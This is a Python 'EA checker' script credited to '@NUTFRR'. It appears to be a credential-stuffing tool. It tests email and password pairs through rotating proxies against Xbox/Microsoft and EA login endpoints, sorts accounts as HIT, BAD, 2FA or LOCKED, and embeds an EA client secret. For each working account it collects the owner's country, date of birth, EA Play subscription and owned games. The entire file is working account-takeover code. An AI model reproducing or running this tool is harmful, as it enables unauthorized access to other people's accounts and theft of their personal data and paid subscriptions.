"""
╔══════════════════════════════════════════╗
║   EA CHECKER (Xbox + EA API)            ║
║          MADE BY - @NUTFRR              ║
╚══════════════════════════════════════════╝
Microsoft OAuth2 → Xbox auth → EA Play via Xbox
OR: Direct EA login → EA profile + sub check
"""
import requests

EA_AUTH_URL     = "https://accounts.ea.com/connect/auth"
EA_TOKEN_URL    = "https://accounts.ea.com/connect/token"
EA_PROFILE_URL  = "https://gateway.ea.com/proxy/identity/pids/me"
EA_ENTITLE_URL  = "https://api1.origin.com/ecommerce2/entitlements/999999999"
EA_SUB_URL      = "https://subscription.ea.com/iap/getUserSubscription"

EA_CLIENT_ID    = "ORIGIN_JS_SDK"
EA_CLIENT_SEC   = "EAjOkIjA5b4KHrPalmGzERetysRETg25DBWZ68v5t1nSvAlP7GjSw7XhZBJHlFKI"

STATUS_HIT    = "HIT"
STATUS_BAD    = "BAD"
STATUS_2FA    = "2FA"
STATUS_LOCKED = "LOCKED"
STATUS_RATE   = "RATELIMIT"
STATUS_ERROR  = "ERROR"
STATUS_NO_EA  = "NO_EA"


def _s(proxy=None):
    s = requests.Session()
    s.timeout = 15
    if proxy:
        p = proxy if proxy.startswith("http") else f"http://{proxy}"
        s.proxies = {"http": p, "https": p}
    return s


def ea_login_direct(email: str, password: str, proxy=None) -> dict:
    """Direct EA login via Origin API."""
    s = _s(proxy)
    try:
        # Step 1: get auth page
        r = s.get(EA_AUTH_URL, params={
            "client_id":     EA_CLIENT_ID,
            "redirect_uri":  "nucleus:rest",
            "response_type": "code",
            "prompt":        "none",
            "release_type":  "prod",
        }, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})

        # Step 2: POST credentials
        r2 = s.post("https://accounts.ea.com/connect/auth", data={
            "email":      email,
            "password":   password,
            "country":    "US",
            "_eventId":   "submit",
            "cid":        EA_CLIENT_ID,
            "showAgeUp":  "1",
            "thirdPartyCaptchaResponse": "",
        }, headers={"Content-Type": "application/x-www-form-urlencoded"},
        allow_redirects=False)

        # check for code in redirect
        loc = r2.headers.get("Location", "")
        if "code=" in loc:
            import re
            code = re.search(r"code=([^&]+)", loc)
            if code:
                # exchange code
                r3 = s.post(EA_TOKEN_URL, data={
                    "grant_type":   "authorization_code",
                    "code":         code.group(1),
                    "client_id":    EA_CLIENT_ID,
                    "client_secret": EA_CLIENT_SEC,
                    "redirect_uri": "nucleus:rest",
                })
                d = r3.json()
                if "access_token" in d:
                    return {"status": "ok", "access_token": d["access_token"],
                            "pid": d.get("pid", "")}

        body = r2.text.lower()
        if "wrong password" in body or "authentication_failed" in body or r2.status_code == 401:
            return {"status": STATUS_BAD}
        if "two-factor" in body or "mfa" in body or "verification" in body:
            return {"status": STATUS_2FA}
        if "locked" in body or "banned" in body or "suspended" in body:
            return {"status": STATUS_LOCKED}
        if r2.status_code == 429:
            return {"status": STATUS_RATE}

        return {"status": STATUS_ERROR, "detail": f"http_{r2.status_code}"}

    except requests.exceptions.Timeout:
        return {"status": STATUS_RATE}
    except Exception as e:
        return {"status": STATUS_ERROR, "detail": str(e)[:80]}


def ea_via_xbox(email: str, password: str, proxy=None) -> dict:
    """
    Get EA access via Xbox auth.
    Microsoft OAuth → Xbox token → EA cross-auth.
    """
    from checkers.xbox_checker import ms_login, _exchange_code, get_xbox_user_token, get_xsts_token
    s = _s(proxy)

    login = ms_login(email, password, proxy)
    st    = login.get("status")
    if st not in ("CODE", "TOKEN"):
        return {"status": st or STATUS_ERROR}

    sess         = login.get("session")
    access_token = login.get("access_token") or _exchange_code(login.get("code", ""), sess)
    if not access_token:
        return {"status": STATUS_ERROR}

    # Get Xbox token with EA relying party
    xbl = get_xbox_user_token(access_token, proxy)
    if not xbl.get("token"):
        return {"status": STATUS_NO_EA}

    try:
        r = s.post("https://xsts.auth.xboxlive.com/xsts/authorize", json={
            "Properties": {
                "SandboxId":  "RETAIL",
                "UserTokens": [xbl["token"]],
            },
            "RelyingParty": "http://origin.com",
            "TokenType": "JWT",
        }, headers={"Content-Type": "application/json", "Accept": "application/json"})
        d = r.json()
        if "XErr" in d:
            return {"status": STATUS_NO_EA}
        xsts_token = d.get("Token", "")
        uhs        = d.get("DisplayClaims", {}).get("xui", [{}])[0].get("uhs", "")

        # Exchange Xbox XSTS for EA token
        r2 = s.get(
            "https://accounts.ea.com/connect/auth",
            params={
                "client_id":     "ORIGIN_JS_SDK",
                "redirect_uri":  "nucleus:rest",
                "response_type": "code",
                "access_token":  f"XBL3.0 x={uhs};{xsts_token}",
                "release_type":  "prod",
            }
        )
        import re
        code = re.search(r"code=([^&]+)", r2.headers.get("Location", ""))
        if not code:
            return {"status": STATUS_NO_EA}

        r3 = s.post(EA_TOKEN_URL, data={
            "grant_type":    "authorization_code",
            "code":          code.group(1),
            "client_id":     "ORIGIN_JS_SDK",
            "client_secret": EA_CLIENT_SEC,
            "redirect_uri":  "nucleus:rest",
        })
        d3 = r3.json()
        if "access_token" in d3:
            return {"status": "ok", "access_token": d3["access_token"], "pid": d3.get("pid", "")}
        return {"status": STATUS_NO_EA}
    except Exception as e:
        return {"status": STATUS_ERROR, "detail": str(e)[:80]}


def get_ea_profile(ea_token: str, proxy=None) -> dict:
    s = _s(proxy)
    try:
        r = s.get(EA_PROFILE_URL, headers={
            "Authorization": f"Bearer {ea_token}",
            "Accept":        "application/json",
        })
        d  = r.json().get("pid", {})
        return {
            "display_name": d.get("displayName", ""),
            "persona_id":   d.get("pidId", ""),
            "country":      d.get("country", ""),
            "dob":          d.get("dob", ""),
            "status":       d.get("status", ""),
        }
    except Exception:
        return {}


def get_ea_subscriptions(ea_token: str, pid: str, proxy=None) -> dict:
    s = _s(proxy)
    result = {
        "ea_play":     False,
        "ea_play_pro": False,
        "ea_play_expiry": "",
    }
    try:
        r = s.get(
            f"https://subscription.ea.com/iap/getUserSubscription/nucleus:UID:{pid}",
            headers={
                "Authorization":  f"Bearer {ea_token}",
                "Accept":         "application/json",
                "X-AuthToken":    ea_token,
            }
        )
        for sub in r.json().get("activeSubscriptionList", []):
            name   = sub.get("name", "").lower()
            expiry = sub.get("expirationDate", "")[:10]
            if "pro" in name or "premier" in name:
                result["ea_play_pro"]    = True
                result["ea_play_expiry"] = expiry
            elif "play" in name or "access" in name or "basic" in name:
                result["ea_play"]        = True
                result["ea_play_expiry"] = expiry
    except Exception:
        pass

    # Fallback: check entitlements
    if not result["ea_play"]:
        try:
            r2 = s.get(
                f"https://api1.origin.com/ecommerce2/entitlements/{pid}",
                headers={"AuthToken": ea_token, "Accept": "application/json"},
            )
            for ent in r2.json().get("entitlements", []):
                offer = ent.get("offerId", "").lower()
                if "eaplay" in offer or "ea_play" in offer or "access" in offer:
                    result["ea_play"] = True
        except Exception:
            pass

    return result


def get_ea_games(ea_token: str, pid: str, proxy=None) -> list:
    """Get list of owned EA games."""
    s = _s(proxy)
    games = []
    try:
        r = s.get(
            f"https://api1.origin.com/ecommerce2/consolidatedentitlements/{pid}?machine_hash=1",
            headers={"AuthToken": ea_token, "Accept": "application/json"},
        )
        for ent in r.json().get("entitlements", [])[:30]:
            name = ent.get("gameDistributionSubType", "") or ent.get("productId", "")
            if name and name not in games:
                games.append(name)
    except Exception:
        pass
    return games[:20]


def check_ea(email: str, password: str, proxy=None) -> dict:
    base = {"email": email, "password": password, "checker": "ea"}

    # Try Xbox auth path first (more reliable for MS accounts)
    xbox_path = ea_via_xbox(email, password, proxy)
    if xbox_path.get("status") == "ok":
        ea_token = xbox_path["access_token"]
        pid      = xbox_path.get("pid", "")
    else:
        # Fallback to direct EA login
        st = xbox_path.get("status")
        if st in (STATUS_BAD, STATUS_2FA, STATUS_LOCKED, STATUS_RATE):
            return {**base, "status": st}
        direct = ea_login_direct(email, password, proxy)
        if direct.get("status") != "ok":
            return {**base, "status": direct.get("status", STATUS_ERROR)}
        ea_token = direct["access_token"]
        pid      = direct.get("pid", "")

    profile = get_ea_profile(ea_token, proxy)
    subs    = get_ea_subscriptions(ea_token, pid, proxy)
    games   = get_ea_games(ea_token, pid, proxy)

    return {
        **base,
        "status":         STATUS_HIT,
        "display_name":   profile.get("display_name", ""),
        "country":        profile.get("country", ""),
        "ea_play":        subs["ea_play"],
        "ea_play_pro":    subs["ea_play_pro"],
        "ea_play_expiry": subs["ea_play_expiry"],
        "games_count":    len(games),
        "games":          games,
    }
